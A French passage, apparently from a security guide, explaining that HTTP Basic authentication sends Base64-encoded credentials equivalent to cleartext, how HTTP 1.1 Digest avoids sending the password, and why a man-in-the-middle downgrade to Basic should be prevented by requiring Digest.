+Ces informations sont envoyées au serveur pour toutes les requêtes suivantes. Avec le protocole HTTP 1.0, l’identification de l’utilisateur est envoyée sur le réseau avec un encodage Base64. C’est équivalent à un texte en clair.
+Le protocole HTTP 1.1 propose une évolution de ce protocole (Digest). Avec certains navigateurs, il est possible d’utiliser une information prouvant la possession du mot de passe. Celui-ci ne voyage jamais sur le réseau. Ainsi, une session ne peut pas être réutilisée. L’URL du document fait partie de l’information d’identification. Ainsi, les attaques se limitent à la récupération d’un même document.
+Pour que cette évolution fonctionne correctement, imposez aux navigateurs de n’utiliser que ce mode étendu d’authentification. Sinon, un hacker placé en position d’homme-au-milieu peut transformer une authentification Digest en authentification Basic. Le client envoie son mot de passe en clair au pirate, qui peut alors prouver qu’il le possède.
